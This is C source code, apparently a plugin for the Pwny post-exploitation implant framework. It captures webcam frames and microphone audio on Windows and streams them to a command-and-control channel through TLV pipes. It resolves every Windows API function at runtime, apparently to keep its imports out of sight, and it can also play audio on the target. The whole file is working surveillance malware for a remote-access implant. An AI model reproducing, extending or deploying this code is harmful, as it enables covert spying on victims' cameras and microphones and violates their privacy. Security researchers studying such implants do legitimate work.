/*
 * MIT License
 *
 * Copyright (c) 2020-2026 EntySec
 *
 * Permission is hereby granted, free of charge, to any person obtaining a copy
 * of this software and associated documentation files (the "Software"), to deal
 * in the Software without restriction, including without limitation the rights
 * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
 * copies of the Software, and to permit persons to whom the Software is
 * furnished to do so, subject to the following conditions:
 *
 * The above copyright notice and this permission notice shall be included in all
 * copies or substantial portions of the Software.
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
 * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
 * SOFTWARE.
 */

/*
 * Media COT plugin — camera capture via VFW + microphone via waveIn.
 * Merged from cam + mic.
 */

#ifdef __windows__

#include <pwny/api.h>
#include <pwny/tlv_types.h>
#include <pwny/c2.h>
#include <pwny/pipe.h>

#include <windows.h>
#include <vfw.h>
#include <mmsystem.h>

#define COT_PLUGIN
#include <pwny/tab_cot.h>

/* ------------------------------------------------------------------ */
/* Tags                                                                */
/* ------------------------------------------------------------------ */

#define MEDIA_CAM_LIST \
        TLV_TAG_CUSTOM(API_CALL_STATIC, TAB_BASE, API_CALL)

#define MEDIA_MIC_PLAY \
        TLV_TAG_CUSTOM(API_CALL_STATIC, TAB_BASE, API_CALL + 1)

#define MEDIA_MIC_LIST \
        TLV_TAG_CUSTOM(API_CALL_STATIC, TAB_BASE, API_CALL + 2)

/* Pipe types — cam and mic get separate pipe slots */
#define MEDIA_CAM_PIPE \
        TLV_PIPE_CUSTOM(PIPE_STATIC, TAB_BASE, PIPE_TYPE)

#define MEDIA_MIC_PIPE \
        TLV_PIPE_CUSTOM(PIPE_STATIC, TAB_BASE, PIPE_TYPE + 1)

/* TLV types — cam */
#define TLV_TYPE_CAM_ID   TLV_TYPE_CUSTOM(TLV_TYPE_INT, TAB_BASE, API_TYPE)

/* TLV types — mic */
#define TLV_TYPE_MIC_ID   TLV_TYPE_CUSTOM(TLV_TYPE_INT, TAB_BASE, API_TYPE)
#define TLV_TYPE_RATE     TLV_TYPE_CUSTOM(TLV_TYPE_INT, TAB_BASE, API_TYPE + 1)
#define TLV_TYPE_CHANNELS TLV_TYPE_CUSTOM(TLV_TYPE_INT, TAB_BASE, API_TYPE + 2)

/* ------------------------------------------------------------------ */
/* Win32 function pointer types                                        */
/* ------------------------------------------------------------------ */

/* Camera (VFW / user32) */
typedef HWND (WINAPI *fn_capCreateCaptureWindowA)(
    LPCSTR, DWORD, int, int, int, int, HWND, int);
typedef BOOL (WINAPI *fn_capGetDriverDescriptionA)(
    UINT, LPSTR, int, LPSTR, int);
typedef BOOL (WINAPI *fn_DestroyWindow)(HWND);
typedef BOOL (WINAPI *fn_PeekMessageA)(LPMSG, HWND, UINT, UINT, UINT);
typedef BOOL (WINAPI *fn_TranslateMessage)(const MSG *);
typedef LRESULT (WINAPI *fn_DispatchMessageA)(const MSG *);
typedef LRESULT (WINAPI *fn_SendMessageA)(HWND, UINT, WPARAM, LPARAM);

/* Microphone (winmm) */
typedef UINT     (WINAPI *fn_waveInGetNumDevs)(void);
typedef MMRESULT (WINAPI *fn_waveInGetDevCapsA)(UINT_PTR, LPWAVEINCAPSA, UINT);
typedef MMRESULT (WINAPI *fn_waveInOpen)(LPHWAVEIN, UINT, LPCWAVEFORMATEX,
                                         DWORD_PTR, DWORD_PTR, DWORD);
typedef MMRESULT (WINAPI *fn_waveInPrepareHeader)(HWAVEIN, LPWAVEHDR, UINT);
typedef MMRESULT (WINAPI *fn_waveInAddBuffer)(HWAVEIN, LPWAVEHDR, UINT);
typedef MMRESULT (WINAPI *fn_waveInStart)(HWAVEIN);
typedef MMRESULT (WINAPI *fn_waveInStop)(HWAVEIN);
typedef MMRESULT (WINAPI *fn_waveInReset)(HWAVEIN);
typedef MMRESULT (WINAPI *fn_waveInUnprepareHeader)(HWAVEIN, LPWAVEHDR, UINT);
typedef MMRESULT (WINAPI *fn_waveInClose)(HWAVEIN);
typedef BOOL     (WINAPI *fn_PlaySoundA)(LPCSTR, HMODULE, DWORD);

/* Shared (kernel32) */
typedef void (WINAPI *fn_Sleep)(DWORD);
typedef void (WINAPI *fn_InitializeCriticalSection)(LPCRITICAL_SECTION);
typedef void (WINAPI *fn_DeleteCriticalSection)(LPCRITICAL_SECTION);
typedef void (WINAPI *fn_EnterCriticalSection)(LPCRITICAL_SECTION);
typedef void (WINAPI *fn_LeaveCriticalSection)(LPCRITICAL_SECTION);

static struct
{
    /* Camera — avicap32 / user32 */
    fn_capCreateCaptureWindowA   pCapCreateCaptureWindowA;
    fn_capGetDriverDescriptionA  pCapGetDriverDescriptionA;
    fn_DestroyWindow             pDestroyWindow;
    fn_PeekMessageA              pPeekMessageA;
    fn_TranslateMessage          pTranslateMessage;
    fn_DispatchMessageA          pDispatchMessageA;
    fn_SendMessageA              pSendMessageA;

    /* Microphone — winmm */
    fn_waveInGetNumDevs          pWaveInGetNumDevs;
    fn_waveInGetDevCapsA         pWaveInGetDevCapsA;
    fn_waveInOpen                pWaveInOpen;
    fn_waveInPrepareHeader       pWaveInPrepareHeader;
    fn_waveInAddBuffer           pWaveInAddBuffer;
    fn_waveInStart               pWaveInStart;
    fn_waveInStop                pWaveInStop;
    fn_waveInReset               pWaveInReset;
    fn_waveInUnprepareHeader     pWaveInUnprepareHeader;
    fn_waveInClose               pWaveInClose;
    fn_PlaySoundA                pPlaySoundA;

    /* Shared — kernel32 */
    fn_Sleep                     pSleep;
    fn_InitializeCriticalSection pInitializeCriticalSection;
    fn_DeleteCriticalSection     pDeleteCriticalSection;
    fn_EnterCriticalSection      pEnterCriticalSection;
    fn_LeaveCriticalSection      pLeaveCriticalSection;
} w;

/* ------------------------------------------------------------------ */
/* VFW macro replacements using resolved SendMessageA                  */
/* ------------------------------------------------------------------ */

#undef capSetUserData
#undef capGetUserData
#undef capSetCallbackOnFrame
#undef capPreviewRate
#undef capPreview
#undef capDriverConnect
#undef capDriverDisconnect
#undef capGrabFrame

#define capSetUserData(hwnd, lp) \
    w.pSendMessageA((hwnd), WM_CAP_SET_USER_DATA, 0, (LPARAM)(lp))
#define capGetUserData(hwnd) \
    w.pSendMessageA((hwnd), WM_CAP_GET_USER_DATA, 0, 0)
#define capSetCallbackOnFrame(hwnd, cb) \
    w.pSendMessageA((hwnd), WM_CAP_SET_CALLBACK_FRAME, 0, (LPARAM)(cb))
#define capPreviewRate(hwnd, ms) \
    w.pSendMessageA((hwnd), WM_CAP_SET_PREVIEWRATE, (WPARAM)(ms), 0)
#define capPreview(hwnd, f) \
    w.pSendMessageA((hwnd), WM_CAP_SET_PREVIEW, (WPARAM)(f), 0)
#define capDriverConnect(hwnd, id) \
    w.pSendMessageA((hwnd), WM_CAP_DRIVER_CONNECT, (WPARAM)(id), 0)
#define capDriverDisconnect(hwnd) \
    w.pSendMessageA((hwnd), WM_CAP_DRIVER_DISCONNECT, 0, 0)
#define capGrabFrame(hwnd) \
    w.pSendMessageA((hwnd), WM_CAP_GRAB_FRAME, 0, 0)
#undef capGetVideoFormat
#define capGetVideoFormat(hwnd, psz, wSize) \
    w.pSendMessageA((hwnd), WM_CAP_GET_VIDEOFORMAT, (WPARAM)(wSize), (LPARAM)(psz))
#undef capGetVideoFormatSize
#define capGetVideoFormatSize(hwnd) \
    w.pSendMessageA((hwnd), WM_CAP_GET_VIDEOFORMAT, 0, 0)

/* ================================================================== */
/* Camera                                                              */
/* ================================================================== */

typedef struct
{
    HWND hCapWnd;
    int device_id;
    LPBYTE frame_data;
    DWORD frame_size;
    CRITICAL_SECTION cs;
    int frame_ready;
    BITMAPINFOHEADER bih;   /* cached video format for BMP wrapping */
    int bih_valid;
} cam_t;

static LRESULT CALLBACK cam_frame_callback(HWND hCapWnd, LPVIDEOHDR lpVHdr)
{
    cam_t *cam;

    cam = (cam_t *)capGetUserData(hCapWnd);
    if (cam == NULL || lpVHdr == NULL)
        return 0;

    w.pEnterCriticalSection(&cam->cs);

    if (cam->frame_data != NULL)
        free(cam->frame_data);

    cam->frame_data = (LPBYTE)malloc(lpVHdr->dwBytesUsed);
    if (cam->frame_data != NULL)
    {
        memcpy(cam->frame_data, lpVHdr->lpData, lpVHdr->dwBytesUsed);
        cam->frame_size = lpVHdr->dwBytesUsed;
        cam->frame_ready = 1;
    }

    w.pLeaveCriticalSection(&cam->cs);
    return 0;
}

static int cam_device_open(cam_t *cam, int device_id)
{
    cam->device_id = device_id;
    cam->frame_data = NULL;
    cam->frame_size = 0;
    cam->frame_ready = 0;

    w.pInitializeCriticalSection(&cam->cs);

    cam->hCapWnd = w.pCapCreateCaptureWindowA(
        "CapWnd", 0, 0, 0, 320, 240, 0, 0);

    if (cam->hCapWnd == NULL)
    {
        log_debug("* Failed to create capture window\n");
        w.pDeleteCriticalSection(&cam->cs);
        return -1;
    }

    capSetUserData(cam->hCapWnd, (LONG_PTR)cam);

    if (!capDriverConnect(cam->hCapWnd, device_id))
    {
        log_debug("* Failed to connect driver (%d)\n", device_id);
        w.pDestroyWindow(cam->hCapWnd);
        return -1;
    }

    capSetCallbackOnFrame(cam->hCapWnd, cam_frame_callback);
    capPreviewRate(cam->hCapWnd, 66);
    capPreview(cam->hCapWnd, TRUE);

    /* Cache the video format so cam_readall can build a valid BMP. */
    {
        DWORD fmtSize = (DWORD)capGetVideoFormatSize(cam->hCapWnd);
        if (fmtSize >= sizeof(BITMAPINFOHEADER))
        {
            BITMAPINFO *pBmi = (BITMAPINFO *)calloc(1, fmtSize);
            if (pBmi != NULL)
            {
                capGetVideoFormat(cam->hCapWnd, pBmi, fmtSize);
                memcpy(&cam->bih, &pBmi->bmiHeader, sizeof(BITMAPINFOHEADER));
                cam->bih_valid = 1;
                free(pBmi);
            }
        }
    }

    return 0;
}

static void cam_device_close(cam_t *cam)
{
    capPreview(cam->hCapWnd, FALSE);
    capSetCallbackOnFrame(cam->hCapWnd, NULL);
    capDriverDisconnect(cam->hCapWnd);
    w.pDestroyWindow(cam->hCapWnd);
    w.pDeleteCriticalSection(&cam->cs);

    if (cam->frame_data != NULL)
    {
        free(cam->frame_data);
        cam->frame_data = NULL;
    }
}

static int cam_grab_frame(cam_t *cam, void **buffer, DWORD *size)
{
    int tries;
    MSG msg;

    for (tries = 0; tries < 50; tries++)
    {
        while (w.pPeekMessageA(&msg, cam->hCapWnd, 0, 0, PM_REMOVE))
        {
            w.pTranslateMessage(&msg);
            w.pDispatchMessageA(&msg);
        }

        capGrabFrame(cam->hCapWnd);
        w.pSleep(50);

        w.pEnterCriticalSection(&cam->cs);
        if (cam->frame_ready)
        {
            *buffer = malloc(cam->frame_size);
            if (*buffer != NULL)
            {
                memcpy(*buffer, cam->frame_data, cam->frame_size);
                *size = cam->frame_size;
            }
            cam->frame_ready = 0;
            w.pLeaveCriticalSection(&cam->cs);
            return (*buffer != NULL) ? 0 : -1;
        }
        w.pLeaveCriticalSection(&cam->cs);
    }

    return -1;
}

static int cam_create(pipe_t *pipe, c2_t *c2)
{
    int device;
    cam_t *cam;

    device = 0;
    tlv_pkt_get_u32(c2->request, TLV_TYPE_CAM_ID, &device);

    cam = (cam_t *)calloc(1, sizeof(*cam));
    if (cam == NULL)
        return -1;

    if (cam_device_open(cam, device) == -1)
    {
        free(cam);
        return -1;
    }

    pipe->flags |= PIPE_SYNCHRONOUS;
    pipe->data = cam;
    return 0;
}

static int cam_readall(pipe_t *pipe, void **buffer)
{
    cam_t *cam;
    DWORD size;
    void *raw;

    cam = (cam_t *)pipe->data;
    size = 0;
    raw = NULL;

    if (cam_grab_frame(cam, &raw, &size) == -1)
        return -1;

    /* Wrap raw DIB pixels in a BMP file so the output is a valid image.
     * Without this the caller receives headerless pixel data. */
    if (cam->bih_valid)
    {
        DWORD hdrTotal = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER);
        DWORD fileSize = hdrTotal + size;
        BYTE *bmp;
        BITMAPFILEHEADER bfh;

        bmp = (BYTE *)malloc(fileSize);
        if (bmp == NULL)
        {
            free(raw);
            return -1;
        }

        memset(&bfh, 0, sizeof(bfh));
        bfh.bfType = 0x4D42;             /* 'BM' */
        bfh.bfSize = fileSize;
        bfh.bfOffBits = hdrTotal;

        memcpy(bmp, &bfh, sizeof(bfh));
        memcpy(bmp + sizeof(bfh), &cam->bih, sizeof(BITMAPINFOHEADER));
        memcpy(bmp + hdrTotal, raw, size);

        free(raw);
        *buffer = bmp;
        return (int)fileSize;
    }

    /* Fallback: return raw data if format wasn't captured. */
    *buffer = raw;
    return (int)size;
}

static int cam_destroy(pipe_t *pipe, c2_t *c2)
{
    cam_t *cam;

    cam = (cam_t *)pipe->data;
    cam_device_close(cam);
    free(cam);

    return 0;
}

static tlv_pkt_t *cam_list(c2_t *c2)
{
    int iter;
    char name[80];
    char version[80];
    tlv_pkt_t *result;

    result = api_craft_tlv_pkt(API_CALL_SUCCESS, c2->request);

    for (iter = 0; iter < 10; iter++)
    {
        if (w.pCapGetDriverDescriptionA(iter, name, sizeof(name),
                                         version, sizeof(version)))
        {
            tlv_pkt_add_string(result, TLV_TYPE_STRING, name);
        }
    }

    return result;
}

/* ================================================================== */
/* Microphone                                                          */
/* ================================================================== */

#define MIC_NUM_BUFFERS 4
#define MIC_BUFFER_SIZE 8192

typedef struct
{
    HWAVEIN hWaveIn;
    WAVEHDR waveHdr[MIC_NUM_BUFFERS];
    unsigned char *buffers[MIC_NUM_BUFFERS];

    CRITICAL_SECTION cs;
    unsigned char *read_buf;
    DWORD read_size;
    DWORD read_pos;
    int ready;
} mic_t;

static void CALLBACK mic_wave_in_proc(HWAVEIN hwi, UINT uMsg,
                                       DWORD_PTR dwInstance,
                                       DWORD_PTR dwParam1,
                                       DWORD_PTR dwParam2)
{
    mic_t *mic;
    WAVEHDR *hdr;

    if (uMsg != WIM_DATA)
        return;

    mic = (mic_t *)dwInstance;
    hdr = (WAVEHDR *)dwParam1;

    if (hdr->dwBytesRecorded == 0)
        return;

    w.pEnterCriticalSection(&mic->cs);

    if (mic->read_buf != NULL)
        free(mic->read_buf);

    mic->read_buf = (unsigned char *)malloc(hdr->dwBytesRecorded);
    if (mic->read_buf != NULL)
    {
        memcpy(mic->read_buf, hdr->lpData, hdr->dwBytesRecorded);
        mic->read_size = hdr->dwBytesRecorded;
        mic->read_pos = 0;
        mic->ready = 1;
    }

    w.pLeaveCriticalSection(&mic->cs);
    w.pWaveInAddBuffer(hwi, hdr, sizeof(WAVEHDR));
}

static tlv_pkt_t *mic_list(c2_t *c2)
{
    UINT count;
    UINT iter;
    WAVEINCAPSA caps;
    tlv_pkt_t *result;

    result = api_craft_tlv_pkt(API_CALL_SUCCESS, c2->request);
    count = w.pWaveInGetNumDevs();

    for (iter = 0; iter < count; iter++)
    {
        if (w.pWaveInGetDevCapsA(iter, &caps, sizeof(caps)) == MMSYSERR_NOERROR)
            tlv_pkt_add_string(result, TLV_TYPE_STRING, caps.szPname);
    }

    return result;
}

static tlv_pkt_t *mic_play(c2_t *c2)
{
    int size;
    unsigned char *buffer;

    size = tlv_pkt_get_bytes(c2->request, TLV_TYPE_BYTES, &buffer);
    if (size <= 0)
        return api_craft_tlv_pkt(API_CALL_FAIL, c2->request);

    if (!w.pPlaySoundA((LPCSTR)buffer, NULL, SND_MEMORY | SND_SYNC))
    {
        free(buffer);
        return api_craft_tlv_pkt(API_CALL_FAIL, c2->request);
    }

    free(buffer);
    return api_craft_tlv_pkt(API_CALL_SUCCESS, c2->request);
}

static int mic_create(pipe_t *pipe, c2_t *c2)
{
    int device;
    int channels;
    int rate;
    int iter;

    WAVEFORMATEX wfx;
    MMRESULT mr;
    mic_t *mic;

    device = 0;
    channels = 1;
    rate = 44100;

    tlv_pkt_get_u32(c2->request, TLV_TYPE_MIC_ID, &device);
    tlv_pkt_get_u32(c2->request, TLV_TYPE_CHANNELS, &channels);
    tlv_pkt_get_u32(c2->request, TLV_TYPE_RATE, &rate);

    mic = (mic_t *)calloc(1, sizeof(*mic));
    if (mic == NULL)
        return -1;

    w.pInitializeCriticalSection(&mic->cs);
    mic->read_buf = NULL;
    mic->read_size = 0;
    mic->read_pos = 0;
    mic->ready = 0;

    wfx.wFormatTag = WAVE_FORMAT_PCM;
    wfx.nChannels = (WORD)channels;
    wfx.nSamplesPerSec = (DWORD)rate;
    wfx.wBitsPerSample = 16;
    wfx.nBlockAlign = wfx.nChannels * wfx.wBitsPerSample / 8;
    wfx.nAvgBytesPerSec = wfx.nSamplesPerSec * wfx.nBlockAlign;
    wfx.cbSize = 0;

    mr = w.pWaveInOpen(&mic->hWaveIn, (UINT)device, &wfx,
                       (DWORD_PTR)mic_wave_in_proc,
                       (DWORD_PTR)mic, CALLBACK_FUNCTION);

    if (mr != MMSYSERR_NOERROR)
    {
        log_debug("* waveInOpen failed (%d)\n", mr);
        w.pDeleteCriticalSection(&mic->cs);
        free(mic);
        return -1;
    }

    for (iter = 0; iter < MIC_NUM_BUFFERS; iter++)
    {
        mic->buffers[iter] = (unsigned char *)calloc(1, MIC_BUFFER_SIZE);
        if (mic->buffers[iter] == NULL)
            goto fail;

        mic->waveHdr[iter].lpData = (LPSTR)mic->buffers[iter];
        mic->waveHdr[iter].dwBufferLength = MIC_BUFFER_SIZE;

        w.pWaveInPrepareHeader(mic->hWaveIn, &mic->waveHdr[iter], sizeof(WAVEHDR));
        w.pWaveInAddBuffer(mic->hWaveIn, &mic->waveHdr[iter], sizeof(WAVEHDR));
    }

    mr = w.pWaveInStart(mic->hWaveIn);
    if (mr != MMSYSERR_NOERROR)
    {
        log_debug("* waveInStart failed (%d)\n", mr);
        goto fail;
    }

    pipe->data = mic;
    return 0;

fail:
    w.pWaveInClose(mic->hWaveIn);
    for (iter = 0; iter < MIC_NUM_BUFFERS; iter++)
    {
        if (mic->buffers[iter])
            free(mic->buffers[iter]);
    }
    w.pDeleteCriticalSection(&mic->cs);
    free(mic);
    return -1;
}

static int mic_read(pipe_t *pipe, void *buffer, int length)
{
    mic_t *mic;
    int copied;

    mic = (mic_t *)pipe->data;
    copied = 0;

    w.pEnterCriticalSection(&mic->cs);

    if (mic->ready && mic->read_buf != NULL)
    {
        copied = (int)(mic->read_size - mic->read_pos);
        if (copied > length)
            copied = length;

        memcpy(buffer, mic->read_buf + mic->read_pos, copied);
        mic->read_pos += copied;

        if (mic->read_pos >= mic->read_size)
        {
            free(mic->read_buf);
            mic->read_buf = NULL;
            mic->read_size = 0;
            mic->read_pos = 0;
            mic->ready = 0;
        }
    }

    w.pLeaveCriticalSection(&mic->cs);

    if (copied == 0)
        w.pSleep(10);

    return copied;
}

static int mic_destroy(pipe_t *pipe, c2_t *c2)
{
    mic_t *mic;
    int iter;

    mic = (mic_t *)pipe->data;

    w.pWaveInStop(mic->hWaveIn);
    w.pWaveInReset(mic->hWaveIn);

    for (iter = 0; iter < MIC_NUM_BUFFERS; iter++)
    {
        w.pWaveInUnprepareHeader(mic->hWaveIn, &mic->waveHdr[iter], sizeof(WAVEHDR));
        if (mic->buffers[iter])
            free(mic->buffers[iter]);
    }

    w.pWaveInClose(mic->hWaveIn);

    w.pEnterCriticalSection(&mic->cs);
    if (mic->read_buf)
        free(mic->read_buf);
    w.pLeaveCriticalSection(&mic->cs);

    w.pDeleteCriticalSection(&mic->cs);
    free(mic);

    return 0;
}

/* ------------------------------------------------------------------ */
/* COT entry                                                           */
/* ------------------------------------------------------------------ */

COT_ENTRY
{
    /* Camera — avicap32 / user32 */
    w.pCapCreateCaptureWindowA = (fn_capCreateCaptureWindowA)
        cot_resolve("avicap32.dll", "capCreateCaptureWindowA");
    w.pCapGetDriverDescriptionA = (fn_capGetDriverDescriptionA)
        cot_resolve("avicap32.dll", "capGetDriverDescriptionA");
    w.pDestroyWindow = (fn_DestroyWindow)
        cot_resolve("user32.dll", "DestroyWindow");
    w.pPeekMessageA = (fn_PeekMessageA)
        cot_resolve("user32.dll", "PeekMessageA");
    w.pTranslateMessage = (fn_TranslateMessage)
        cot_resolve("user32.dll", "TranslateMessage");
    w.pDispatchMessageA = (fn_DispatchMessageA)
        cot_resolve("user32.dll", "DispatchMessageA");
    w.pSendMessageA = (fn_SendMessageA)
        cot_resolve("user32.dll", "SendMessageA");

    /* Microphone — winmm */
    w.pWaveInGetNumDevs = (fn_waveInGetNumDevs)
        cot_resolve("winmm.dll", "waveInGetNumDevs");
    w.pWaveInGetDevCapsA = (fn_waveInGetDevCapsA)
        cot_resolve("winmm.dll", "waveInGetDevCapsA");
    w.pWaveInOpen = (fn_waveInOpen)
        cot_resolve("winmm.dll", "waveInOpen");
    w.pWaveInPrepareHeader = (fn_waveInPrepareHeader)
        cot_resolve("winmm.dll", "waveInPrepareHeader");
    w.pWaveInAddBuffer = (fn_waveInAddBuffer)
        cot_resolve("winmm.dll", "waveInAddBuffer");
    w.pWaveInStart = (fn_waveInStart)
        cot_resolve("winmm.dll", "waveInStart");
    w.pWaveInStop = (fn_waveInStop)
        cot_resolve("winmm.dll", "waveInStop");
    w.pWaveInReset = (fn_waveInReset)
        cot_resolve("winmm.dll", "waveInReset");
    w.pWaveInUnprepareHeader = (fn_waveInUnprepareHeader)
        cot_resolve("winmm.dll", "waveInUnprepareHeader");
    w.pWaveInClose = (fn_waveInClose)
        cot_resolve("winmm.dll", "waveInClose");
    w.pPlaySoundA = (fn_PlaySoundA)
        cot_resolve("winmm.dll", "PlaySoundA");

    /* Shared — kernel32 */
    w.pSleep = (fn_Sleep)
        cot_resolve("kernel32.dll", "Sleep");
    w.pInitializeCriticalSection = (fn_InitializeCriticalSection)
        cot_resolve("kernel32.dll", "InitializeCriticalSection");
    w.pDeleteCriticalSection = (fn_DeleteCriticalSection)
        cot_resolve("kernel32.dll", "DeleteCriticalSection");
    w.pEnterCriticalSection = (fn_EnterCriticalSection)
        cot_resolve("kernel32.dll", "EnterCriticalSection");
    w.pLeaveCriticalSection = (fn_LeaveCriticalSection)
        cot_resolve("kernel32.dll", "LeaveCriticalSection");

    /* API call handlers */
    api_call_register(api_calls, MEDIA_CAM_LIST, cam_list);
    api_call_register(api_calls, MEDIA_MIC_PLAY, mic_play);
    api_call_register(api_calls, MEDIA_MIC_LIST, mic_list);

    /* Camera pipe */
    {
        pipe_callbacks_t callbacks;
        memset(&callbacks, 0, sizeof(callbacks));
        callbacks.create_cb = cam_create;
        callbacks.readall_cb = cam_readall;
        callbacks.destroy_cb = cam_destroy;
        api_pipe_register(pipes, MEDIA_CAM_PIPE, callbacks);
    }

    /* Microphone pipe */
    {
        pipe_callbacks_t callbacks;
        memset(&callbacks, 0, sizeof(callbacks));
        callbacks.create_cb = mic_create;
        callbacks.read_cb = mic_read;
        callbacks.destroy_cb = mic_destroy;
        api_pipe_register(pipes, MEDIA_MIC_PIPE, callbacks);
    }
}

#endif
